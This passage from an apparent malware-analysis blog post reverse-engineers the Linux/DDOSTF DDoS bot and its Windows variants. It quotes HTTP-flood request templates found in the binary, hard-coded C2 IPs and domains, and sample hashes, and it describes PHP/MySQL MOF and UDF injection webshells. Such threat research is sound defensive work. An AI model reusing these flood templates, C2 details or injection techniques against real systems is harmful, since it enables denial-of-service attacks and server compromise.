href=\"https:\/\/lh3.googleusercontent.com\/-CWqFnu5piNY\/Vori4hLAgeI\/AAAAAAAAUJ4\/F47BQDl53fc\/s5120\/009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-CWqFnu5piNY\/Vori4hLAgeI\/AAAAAAAAUJ4\/F47BQDl53fc\/s580\/009.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003ELinux\/DDOSTF a new ELF DDoS malware\u003C\/h2\u003E \u003Cp\u003EI decided to name the new malware as \u003Cb\u003ELinux\/DDOSTF\u003C\/b\u003E since this is the specific malware made for this site, it's original and we can see its characteristic clearly. The first ELF file of this kind which was spotted online, is named as \u003Ci\u003EJrLinux\u003C\/i\u003E, which is probably its original name(?), but \u003Cb\u003ELinux\/DDOSTF\u003C\/b\u003E is easier to remember to refer to its threat's source.  \u003Cp\u003EThe samples are all originally coded in C compiled with stripped and static ELF, it is \u003Ci\u003E\"fun\" \u003C\/i\u003Eto reverse. This malware uses the 2 types of CNC, the one which is the pingback that is hard-coded its IP address in the binary, as you can see in the next picture, and the other is the hidden decoded \u003Ci\u003Ebase64\u003C\/i\u003E hostname. All of the binaries are builder basis which the five of them are all identical in skeleton that shows the ELF basis template was used as a master.   \u003Cp\u003EThe first relation of the \u003Cb\u003Eddos.tf\u003C\/b\u003E with this panel can be viewed in the new ELF \u003Cb\u003ELinux\/DDOSTF\u003C\/b\u003E in the below location\/address which is stated its threat origin (refer to the 8888 binary):\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1AO1YDIMVw4\/VorXNyZmOOI\/AAAAAAAAUIw\/XhJt5IPQLU0\/s5120\/008a.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1AO1YDIMVw4\/VorXNyZmOOI\/AAAAAAAAUIw\/XhJt5IPQLU0\/s580\/008a.png\u003E\u003C\/a\u003E\u003Cbr\u003EYou can see also the IP address for the first connection is written in hard-coded.   \u003Cp\u003EThe second relation is as per explained in the \u003Cb\u003Eddos.tf\u003C\/b\u003E site itself, it's camouflage the ELF into the Windows .exe file, as per seen in the new ELF with injected strings as if a Windows binary's property..\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E[0x0804a0b0]\u003E iz~Win\u003Cbr \/\u003Evaddr=0x080ca1c6 [..] sz=25 len=24 [..] string=\"Windows Help System Myss\"\u003Cbr \/\u003Evaddr=0x080ca206 [..] sz=15 len=14 [..] string=\"WinHelp32 Myss\"\u003Cbr \/\u003Evaddr=0x080ca246 [..] sz=49 len=48 [..] string=\"Windows Help System for X32 windows desktop Myss\"\u003Cbr \/\u003E\u003C\/pre\u003EAs you can see in the screenshot in the \u003Cb\u003Eddos.tf \u003C\/b\u003Esite:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-B6GFW7Lr3CM\/VorYzlErN_I\/AAAAAAAAUI8\/62U214mMbMY\/s5118\/008b.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-B6GFW7Lr3CM\/VorYzlErN_I\/AAAAAAAAUI8\/62U214mMbMY\/s580\/008b.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThe usage of the \u003Ci\u003Emyss \u003C\/i\u003Eis also spotted in \u003Cb\u003Emyss.exe\u003C\/b\u003E and \u003Cb\u003Emyss\u003C\/b\u003E injection panel. So this is their \"idea\" of bypassing firewall as per also written in the chinese language promotion note in the \u003Cb\u003Eddos.tf\u003C\/b\u003E site.  \u003Cp\u003EThe attacker part is initially can be spotted starting at 0x0804A3D8 which is having two initial values of \u003Ci\u003EUDP-Flow (default) \u003C\/i\u003Eor \u003Ci\u003ESYN-Flow \u003C\/i\u003Eflags defined during the distribution:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-qaTcAwhwgh4\/VorfaHMyIMI\/AAAAAAAAUJQ\/qgeeZSTsSF0\/s5120\/008c.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-qaTcAwhwgh4\/VorfaHMyIMI\/AAAAAAAAUJQ\/qgeeZSTsSF0\/s580\/008c.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EIf you trace it further you'll meet the \u003Ci\u003Ejump switch\u003C\/i\u003E in here, which stated the specific form of each attacks:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Ts8M1KVj60k\/VosUiLSgZCI\/AAAAAAAAUKw\/0kodyj2T-3k\/s5120\/008h.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Ts8M1KVj60k\/VosUiLSgZCI\/AAAAAAAAUKw\/0kodyj2T-3k\/s580\/008h.png\u003E\u003C\/a\u003E\u003Cbr\u003EI counted to see 12 routes to packet flood logic via below jump references: \u003Cpre class=\"brush: asm\"\u003E0x08049E07 0x08049F42 0x08049FEA 0x08049E9A\u003Cbr \/\u003E0x0804A05A 0x08049F0A 0x08049FB2 0x08049E67\u003Cbr \/\u003E0x0804A022 0x08049ED2 0x08049F7A 0x08049E37\u003Cbr \/\u003E\u003C\/pre\u003EWhich are having SYN, DNS, TCP and ACK logic, with four of them are HTTP floods using following snippets as HTTP headers, these 12 attacks is well-known used in \u003Ci\u003ELinux\/BillGates\u003C\/i\u003E and these functions are likely being snagged \u0026 modified by \u003Cb\u003Eddos.tf\u003C\/b\u003E.  \u003Cpre class=\"brush: asm\"\u003E0x080b1d74 .string\"\u003Cbr \/\u003EGET %s HTTP\/1.1\\\\r\\\\n\u003Cbr \/\u003EHost: %s\\\\r\\\\n\u003Cbr \/\u003EConnection: Keep-Alive\\\\r\\\\n\u003Cbr \/\u003EAccept: *\/*\\\\r\\\\n\u003Cbr \/\u003EAccept-Language: zh-CN\\\\r\\\\n\u003Cbr \/\u003EAccept-Encoding: gzip, deflate\\\\r\\\\n\u003Cbr \/\u003EUser-Agent: Mozilla\/5.0+(compatible;+Baiduspider\/2.0;++http:\/\/wwwbaidu.com\/search\/spider.html)\\\\r\\\\n\u003Cbr \/\u003EReferer: http:\/\/%s%s\\\\r\\\\n\u003Cbr \/\u003EPragma: no-cache\\\\r\\\\n\u003Cbr \/\u003EDNT: 1\\\\r\\\\n\u003Cbr \/\u003EConnection: Keep-Alive\\\\r\\\\n\"\u003Cbr \/\u003E\u003Cbr \/\u003E0x080b1e98 .string \"\u003Cbr \/\u003EGET %s HTTP\/1.1\\\\r\\\\n\u003Cbr \/\u003EHost: %s\\\\r\\\\n\u003Cbr \/\u003EConnection: Keep-Alive\\\\r\\\\n\u003Cbr \/\u003EAccept: *\/*\\\\r\\\\n\u003Cbr \/\u003EAccept-Language: zh-CN\\\\r\\\\n\u003Cbr \/\u003EAccept-Encoding: gzip, deflate\\\\r\\\\n\u003Cbr \/\u003EUser-Agent:Mozilla\/5.0 (compatible;+Googlebot\/2.1;++http:\/\/www.google.com\/bot.html)\\\\r\\\\n\u003Cbr \/\u003EReferer: http:\/\/%s%s\\\\r\\\\n\u003Cbr \/\u003EPragma: no-cache\\\\r\\\\n\u003Cbr \/\u003EDNT: 1\\\\r\\\\n\u003Cbr \/\u003EConnection: Keep-Alive\\\\r\\\\n\\\\r\\\\n\"\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EThe hidden CNC leads to the domain of \u003Cb\u003Emyss.basec.cc\u003C\/b\u003E which is the third PoC relation of the malware download panel to the \u003Cb\u003Eddos.tf\u003C\/b\u003E service (the \u003Cb\u003E\u003Ci\u003Emyss \u003C\/i\u003E\u003C\/b\u003Emark), you can spot these sign in \"distributed\" version of the binaries at the below info, with its resolved data now:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-2GN607yGc50\/VoriYkzoahI\/AAAAAAAAUJc\/PikQ8nf52V0\/s5120\/008e.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-2GN607yGc50\/VoriYkzoahI\/AAAAAAAAUJc\/PikQ8nf52V0\/s580\/008e.png\u003E\u003C\/a\u003E\u003Cbr\u003EAnd the function uses this CNC is in \u003Ci\u003E0x8048FE8\u003C\/i\u003E with its communication \"protocol\".\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-191tYbnaHgM\/VoriYupSaOI\/AAAAAAAAUJk\/QU_nyCTIek8\/s4120\/008d.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-191tYbnaHgM\/VoriYupSaOI\/AAAAAAAAUJk\/QU_nyCTIek8\/s580\/008d.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe IP registered to this CNC is 58.220.41.10 in: \u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"58.220.41.10\",\u003Cbr \/\u003E  \"hostname\": \"No Hostname\",\u003Cbr \/\u003E  \"city\": \"Nanjing\",\u003Cbr \/\u003E  \"region\": \"Jiangsu Sheng\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"loc\": \"32.0617,118.7778\",\u003Cbr \/\u003E  \"org\": \"AS23650 AS Number for CHINANET jiangsu province backbone\"\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EOn the first run, the malware does \u003Ci\u003Esys_clone\u003C\/i\u003E itself and then re-\u003Ci\u003E sys_clone\u003C\/i\u003E-ing itself to then redirect the \u003Ci\u003Estdin, stdout, and stderr\u003C\/i\u003E to \u003Ci\u003E\/dev\/null\u003C\/i\u003E (for silent noises) and then do the \u003Ci\u003Edouble sys_clone\u003C\/i\u003E again following by changing its \u003Ci\u003Ework directory\u003C\/i\u003E to \u003Ci\u003E\u003Cb\u003E\/tmp\u003C\/b\u003E\u003C\/i\u003E , it then runs its main process afterward. This information is important if you want to trail\/debug its processes properly.   \u003Cp\u003EThis DDoS'er connects to first CNC, to send the initial infected report which I counted as 520 bytes blob data:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-IifljeRzUdU\/VoruUW1Ik4I\/AAAAAAAAUKU\/K-03pwvu9fc\/s5120\/008f.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-IifljeRzUdU\/VoruUW1Ik4I\/AAAAAAAAUKU\/K-03pwvu9fc\/s580\/008f.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EAs you can see in the picture above, along with the system information, the infected host is informing the CNC whether the ELF initially flagged as UDP-flow or SYN-flow, and that info received is shown in the panel shown at \u003Cb\u003Eddos.tf\u003C\/b\u003E site's screenshot:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-AK8I1OnhfDs\/VoryGZtSWlI\/AAAAAAAAUKg\/sh9PyoYrrjI\/s5586\/008g.PNG\"\u003E\u003Cimgsrc=https:\/\/lh3.googleusercontent.com\/-AK8I1OnhfDs\/VoryGZtSWlI\/AAAAAAAAUKg\/sh9PyoYrrjI\/s580\/008g.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EWell, accordingly from the CNC, the below part of its control panel will be the place where the target of the DDoS will be entered, correspondenced to the infected DDoS Linux\/DDOSTF bots to start the attack.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-CBn5bM-59FY\/Vos1dzOkc-I\/AAAAAAAAULg\/Pu8RwOQU9SY\/s5120\/012.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-CBn5bM-59FY\/Vos1dzOkc-I\/AAAAAAAAULg\/Pu8RwOQU9SY\/s580\/012.PNG\u003E\u003C\/a\u003E \u003Cp\u003EAfter calling back, this malware is \u003Ci\u003Esupposed \u003C\/i\u003Eto make connection to the decoded CNC in \u003Cb\u003Emyss.basec.cc\u003C\/b\u003E afterward, and static compiled DNS resolver library will translate the connection to its IP to \u003Ci\u003Esupposedly\u003C\/i\u003E performing further steps. \u003Ca name=\"oldver\"\u003E\u003Cp\u003E\u003Cfont color=yellow\u003E\u003Cb\u003EThis is an additional: The previous version differences\u003C\/b\u003E\u003C\/font\u003E\u003Cbr\u003E\u003C\/a\u003EI was informed the existence of the older sample (hash: \u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/98a0e070e4675915dcd6317b266cc8e025a271e7ff3e633bc21bb6f6933f0223\/analysis\/\"\u003Edac95d35a611cc8b4f21f9f77e10ead9\u003C\/a\u003E) uploaded in the VirusTotal in November 27th, 2015 (thank's Michal Malik for poking me on this). This is, currently, the oldest sample we can fetch for the current threat, showing the previous versions (suspecting version 5 or 4) of the \u003Cb\u003ELinux\/DDOSTF\u003C\/b\u003E ELF malware. In this version the malware is using a single CNC in hostname basis (hardcoded) as \u003Cb\u003Ebalei.f3322.org:6666 (222.186.34.143:6666)\u003C\/b\u003E. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-7C3Ahq_Abxc\/Vov-qDRiugI\/AAAAAAAAUM4\/nJzzXhZUcsQ\/s4120\/017.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-7C3Ahq_Abxc\/Vov-qDRiugI\/AAAAAAAAUM4\/nJzzXhZUcsQ\/s580\/017.png\u003E\u003C\/a\u003E\u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"222.186.34.143\",\u003Cbr \/\u003E  \"city\": \"Nanjing\",\u003Cbr \/\u003E  \"region\": \"Jiangsu Sheng\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"org\": \"AS23650 AS Number for CHINANET jiangsu province backbone\"\u003Cbr \/\u003E  \"prefix:\" \"222.186.34.0\/23\"\u003Cbr \/\u003E\u003C\/pre\u003EThis earlier version also doesn't have the SYN\/UDP-Flow tag, and therefore doesn't have the encoded hidden CNC function\/data.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-VG1om2dc4IM\/Vov-qDyvDeI\/AAAAAAAAUM0\/YSmSnZYDCyc\/s5120\/018.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-VG1om2dc4IM\/Vov-qDyvDeI\/AAAAAAAAUM0\/YSmSnZYDCyc\/s580\/018.png\u003E\u003Cbr\u003E\u003C\/a\u003E\u003Cbr\u003ESo it seems the hidden CNC is a new feature. I am not so sure why the hidden CNC is used in the recent version only. It's suggesting \"maybe\" the coder want to secretly track the distribution of this malware binaries. Below is an easy way to check that encoded CNC:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-hM3s-fdNxJw\/VowA8vaXU9I\/AAAAAAAAUNI\/nNlJX1XFqps\/s5120\/019.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-hM3s-fdNxJw\/VowA8vaXU9I\/AAAAAAAAUNI\/nNlJX1XFqps\/s580\/019.png\u003E\u003C\/a\u003E \u003Cp\u003EThe hashes of the ELF samples \u0026 their checked CNC are as per below, our team mates are uploading the samples to the VirusTotal accordingly: \u003Cpre class=\"brush: asm\"\u003EHash (md5)                        ELF      CNC1                CNC2\u003Cbr \/\u003E--------------------------------------------------------------------------- \u003Cbr \/\u003E71a868cdcc6b79b7d274e3b558cd4596  8888     173.254.236.97:8888 myss.basec.cc(port: 8893)\u003Cbr \/\u003E3e0d96cd1e0a97e61d96b7863f39a1d4  6666     122.114.124.26:6666 myss.basec.cc(port: 8893) \u003Cbr \/\u003E3e0d96cd1e0a97e61d96b7863f39a1d4  V6       122.114.124.26:6666 myss.basec.cc(port: 8893)\u003Cbr \/\u003Ebf65b4947b194be658fdc2b2fb09c35b  V61      122.114.124.26:3795 myss.basec.cc(port: 8893)\u003Cbr \/\u003E3df2c500b5466b5ed2c7907fe8e0e1d5  V62      122.114.124.26:3795 (none)       (none)\u003Cbr \/\u003E3e0d96cd1e0a97e61d96b7863f39a1d4  JrLinux  122.114.124.26:6666 myss.basec.cc(port: 8893) \u003Cbr \/\u003Edac95d35a611cc8b4f21f9f77e10ead9  oldver  balei.f3322.org:6666 (none)       (none)\u003Cbr \/\u003E*) myss.basec.cc = 58.220.41.10 (CN\/AS23650\/Chinanet Jiangshu)\u003Cbr \/\u003E*) balei.f3322.org = 222.186.34.143 (CN\/AS23650\/Chinanet Jiangshu)\u003Cbr \/\u003E---------------------------------------------------------------------------\u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003EWindows DDoSer used is..Mr.Black WinPE variant\u003C\/h2\u003E \u003Cp\u003EThe DDOS client payload for the Windows is Mr.Black WinPE version, it is a known threat with the good detection ratio, so I will not make comment for this. \u003Cbr\u003EThe sample is in Virus Total [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/70da209712f8fd513df6e76100c861fc714e60f8e477db82de76767d27612d5d\/analysis\/\"\u003Elink\u003C\/a\u003E]. And the CNC accessed is hostname basis \u003Cb\u003Emyss.ddns.net (with same IP address as ELF at 58.220.41.10)\u003C\/b\u003E in \u003Cb\u003Eport 8893\u003C\/b\u003E too.  \u003Cp\u003E\u003Ch2\u003EASP WinShell + PHP MySQL .MOF WinShell + etc\u003C\/h2\u003E \u003Cp\u003EThis story is not over yet, there are two files that is important for all of us to be aware of, as per marked below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-p0Lb4eTPo-Y\/VosfrVfdYqI\/AAAAAAAAULA\/gI-E3yIPT5k\/s5588\/010.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-p0Lb4eTPo-Y\/VosfrVfdYqI\/AAAAAAAAULA\/gI-E3yIPT5k\/s580\/010.PNG\u003E\u003C\/a\u003E \u003Cp\u003EThe .aspx file, which it's not a new threat, is an ASP Web Shell which its functions are self-explanatory in the modified snapshot below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Lh8tXRawzy4\/VoqgoaclevI\/AAAAAAAAUHc\/pJMsywYf_iY\/s12212-Ic42\/002d.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Lh8tXRawzy4\/VoqgoaclevI\/AAAAAAAAUHY\/on6l_NxZAF4\/s1280\/002d.png\u003E\u003C\/a\u003E \u003Cp\u003EThe interesting one is the \u003Cb\u003Emof.php\u003C\/b\u003E file, it is the PHP-MySQL coded to aim WMI exploitation via malicious MOF file. The common practise for the known MOF exploit file is by ASP script, but this attacker is using rather unique method, by using PHP \u0026 MySQL instead.   \u003Cp\u003EThe interface can be pretty much viewed if you run it safely as web code as per following:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-vKTukHZfWl0\/VoqmdL5HDDI\/AAAAAAAAUHo\/h2Gd2nrMd8I\/s5120\/002e.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-vKTukHZfWl0\/VoqmdL5HDDI\/AAAAAAAAUHo\/h2Gd2nrMd8I\/s580\/002e.png\u003E\u003C\/a\u003E \u003Cp\u003ESince the PHP\/MySQL as front end for WMI exploitation via MOF injection is rather rare to myself and my fellow team mates too, I tried to break down its codes as detailed as possible in the picture below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-K_CwENigW_E\/Vos4Q2UPLEI\/AAAAAAAAULs\/EzIJcjmRgcs\/s6120\/002f.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-K_CwENigW_E\/Vos4Q2UPLEI\/AAAAAAAAULs\/EzIJcjmRgcs\/s580\/002f.png\u003E\u003C\/a\u003E\u003Cbr\u003EIt's amazingly \"evil concept\" isn't it? Yes, it is obviously a copy-paste code (see reference). I don't think they even calculated the chance to infect Windows running with PHP and MySQL installed beforehand..no wonder it has the low infection hit even it's  already up ITW like 6+ months.  \u003Cp\u003EI almost miss this one. There is more \"Binary Injection Webshell\" tool also \u003Ci\u003Epowerd by PHP\/MySQL\u003C\/i\u003E in that panel: it is \u003Cb\u003Eudf.php\u003C\/b\u003E, the snapshot taken during some efforts emulating the web shell :\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-m04-xvrzGzw\/VotgElyvivI\/AAAAAAAAUL8\/SgN0Qf-Ihvo\/s5120\/2001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-m04-xvrzGzw\/VotgElyvivI\/AAAAAAAAUL8\/SgN0Qf-Ihvo\/s580\/2001.png\u003E\u003C\/a\u003E\u003Cbr\u003EI translated the Chinese comments and captions, and also neutralized the code for not being maliciously re-used then uploaded it to our pastebin [\u003Ca href=\"https:\/\/pastebin.com\/dV3DMa92\"\u003Elink\u003C\/a\u003E] for your review due to mitigation purpose. It's a PHP\/SQL base (malicious) DLL injector with the custom injection option interface, with hard-coded the template default DLL in its PHP as binary text.   \u003Cp\u003ESeeing these two MySQL-base injection webshell scripts, I start to realize that MySQL is also powerful tool to perform a binary and file injection, and that is the reason why the actor was putting \u003Ci\u003Emysql.exe\u003C\/i\u003E in the panel too. \"Maybe\" this is also why PHP code is chosen instead ASP. Or maybe I just took it too serious and the actor is just another \u003Ci\u003Ecopy-paster\u003C\/i\u003E :-)  \u003Cp\u003EOne last thing that maybe we all need to know is the tool called \u003Ci\u003E\u003Cb\u003ENetFuke\u003C\/b\u003E\u003C\/i\u003E is spotted in the panel, which is a nice PRC made interface sniffer [\u003Ca href=\"http:\/\/www.xdowns.com\/soft\/1\/44\/2014\/soft_133960.html\"\u003Elink\u003C\/a\u003E], and looks like the atacker was using it as a tool to generate report like this:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-tP7bG0iihwI\/VoqxFot_vpI\/AAAAAAAAUIA\/vD-MUBRkhBE\/s6120\/002g.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-tP7bG0iihwI\/VoqxFot_vpI\/AAAAAAAAUIA\/vD-MUBRkhBE\/s580\/002g.PNG\u003E\u003C\/a\u003E \u003Cp\u003EYes. This panel is really heavy loaded not only with malware but with webshell weapons \u0026 hacking tools. The ELF \u0026 windows malware used are pointing to the \u003Cb\u003Eddos.tf\u003C\/b\u003E. Are these attackers actually the actor behind \u003Cb\u003Eddos.tf\u003C\/b\u003E site (owners\/administrators)? Or maybe one of the \"customers\" of the \u003Cb\u003Eddos.tf\u003C\/b\u003E? It's still a question. Either way, the activity of the infection panel has to be stopped.  \u003Cp\u003E\u003Ca name=\"winpe\"\u003E\u003Cbr\u003E\u003Cp\u003E\u003Ch1\u003ENew Additional: DDOS.TF new samples in Windows PE\u003C\/h1\u003E\u003C\/a\u003E \u003Cp\u003ERecently I found a panel in Hongkong contains the binaries of Windows PE of DDOSTF that are not originated to MrBlack-base code (an improvement from what was previous written in this blog post), but these new binaries were either ported from the DDOSTF or coded based on the same logic as the linux version: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1Hc4TYFFmu4\/VwnEPXYKgKI\/AAAAAAAAUjE\/LcERiX2Zi2U2sobv3KOEZIJzuZK_Tzk1Q\/s2120\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1Hc4TYFFmu4\/VwnEPXYKgKI\/AAAAAAAAUjE\/LcERiX2Zi2U2sobv3KOEZIJzuZK_Tzk1Q\/s580\/001.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe samples I uploaded to kernelmode --\u003E\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=4168\u0026p=28246#p28246\"\u003Ehere\u003C\/a\u003E, feel free to fetch.  \u003Cp\u003EThe unique functionality of this windows version is the Windows OS detection, which is providing detection from Windows 2000 to Windows 8 as you can see in the below 2 snippet code:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ic7GYHX8VpA\/VwnUEfmrEFI\/AAAAAAAAUjc\/rRJeRfXlecULKo6zgsGdrYnNom7WFTHwQ\/s2580\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ic7GYHX8VpA\/VwnUEfmrEFI\/AAAAAAAAUjc\/rRJeRfXlecULKo6zgsGdrYnNom7WFTHwQ\/s580\/002.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-kyI6VAoqv3o\/VwnUNBqNQTI\/AAAAAAAAUjg\/jiHKJS5L4msk1spd1gSZxBMbhs1tZCr-w\/s2120\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-kyI6VAoqv3o\/VwnUNBqNQTI\/AAAAAAAAUjg\/jiHKJS5L4msk1spd1gSZxBMbhs1tZCr-w\/s580\/003.png\u003E\u003C\/a\u003E\u003Cbr\u003EAfter the version checked, the below case switch action will be executed depends on the flag of commands:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-56S2ROs4Ns8\/VwnU_eAN1UI\/AAAAAAAAUjo\/JcYBCpDdR54R5oK8A_ah2fDBKfXj9UOXQ\/s2580\/004.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-56S2ROs4Ns8\/VwnU_eAN1UI\/AAAAAAAAUjo\/JcYBCpDdR54R5oK8A_ah2fDBKfXj9UOXQ\/s580\/004.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThe code is in fn.0x40483B(), if you want to see the disassembled code one is in--\u003E\u003Ca href=\"https:\/\/pastebin.com\/azMB19tr\"\u003Ehere\u003C\/a\u003E \u003Cp\u003EThe offensive function was called in the case 0x5 to the fn.0x00403f05. You will see some same SleepTrick() (or break or 0 pause tricks combined calling prinf)..whatever you want to call it, which is explaining that many printf() was called (see picture below)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-NBwyam3cNHY\/VwndDOEZVVI\/AAAAAAAAUj8\/RVgAWIJri3ARDHJfGPyh3ScOQTER3Q-Eg\/s2120\/006.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-NBwyam3cNHY\/VwndDOEZVVI\/AAAAAAAAUj8\/RVgAWIJri3ARDHJfGPyh3ScOQTER3Q-Eg\/s580\/006.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EJust pass these and move forward to 0x00403f52 where you can see the other switch of 0x12 case for the thread management (picture is below)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-m1Umh4S-cpQ\/Vwnd-vr5H_I\/AAAAAAAAUkE\/6HFZ37oJRggclN-rb0SzJAgbRYADueT8w\/s2120\/005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-m1Umh4S-cpQ\/Vwnd-vr5H_I\/AAAAAAAAUkE\/6HFZ37oJRggclN-rb0SzJAgbRYADueT8w\/s580\/005.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe switch-cases I sorted as per below:\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-XA7hAozveFQ\/VwniHvySZNI\/AAAAAAAAUkQ\/tUee9S8d8qYpcVktl2fWjaQG9KGR99ldg\/s320\/007.PNG\u003E\u003Cbr\u003EEach switch is having calls specific way on attack method and in creating threads and handles.   \u003Cp\u003EOne thing that can be used to ID the threat is the attack code in 0x0403D7a at the below code:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-XmKZtQGDzKk\/VwnmMVgMnLI\/AAAAAAAAUkc\/omh-Pp7DWWc-pGOZ9AUbM6JOPQDLvUXLQ\/s2120\/008.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-XmKZtQGDzKk\/VwnmMVgMnLI\/AAAAAAAAUkc\/omh-Pp7DWWc-pGOZ9AUbM6JOPQDLvUXLQ\/s580\/008.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThis is match to the \"myss\" tag in--\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-2GN607yGc50\/VoriYkzoahI\/AAAAAAAAUJc\/PikQ8nf52V0\/s5120\/008e.png\"\u003Ehere\u003C\/a\u003E. This is the callback function that is using HTTP with specific HTTP referer to Baidu address: \u003Cpre\u003E\"Cache-Control: no-cache\\r\\nReferer: http:\/\/www.baidu.com\\r\\n\"\u003C\/pre\u003E \u003Cp\u003EEach attack performed is simple and specific, like the part I reversed in here:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-MtxZW9XiT3s\/VwnnKd1ZQTI\/AAAAAAAAUkk\/OzQ8LJKDlis1qY9ga5ckNaQuE5Yu84g2w\/s2120\/200.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-MtxZW9XiT3s\/VwnnKd1ZQTI\/AAAAAAAAUkk\/OzQ8LJKDlis1qY9ga5ckNaQuE5Yu84g2w\/s580\/200.png\u003E\u003C\/a\u003E\u003Cbr\u003EOther attacks has different logic, it is really case by case..  \u003Cp\u003EAdditionally, DDOS.TF windows versions are also having function to manipulate origin IP address into 192.168.1.244 and 192.168.1.32, which can be found in two attacks functions in my sample.  \u003Cp\u003EI hate to mock, but I have to do it after seeing the HTTP headers used for the L7 attacks of Win32\/DDOS.TF, see it carefully and you will know how \"IMPOSSIBLE\" for some faked bots requesting in such combination.. This is supporting the fact that the coder\/group behind this malware are teenagers with lacking of knowledge..\u003Cbr\u003EPlease see below picture in marked parts, think it well and enjoy! :-))\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-xGOavqsfuEk\/Vwnq7_B08hI\/AAAAAAAAUkw\/gNqrljU3My0eYEAPez05T6baOQexHcv5w\/s2120\/009.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-xGOavqsfuEk\/Vwnq7_B08hI\/AAAAAAAAUkw\/gNqrljU3My0eYEAPez05T6baOQexHcv5w\/s580\/009.PNG\u003E\u003C\/a\u003E \u003Cp\u003ETo the young scums behind this threat, our message to you: \u003Cbr\u003E\u003Cfont 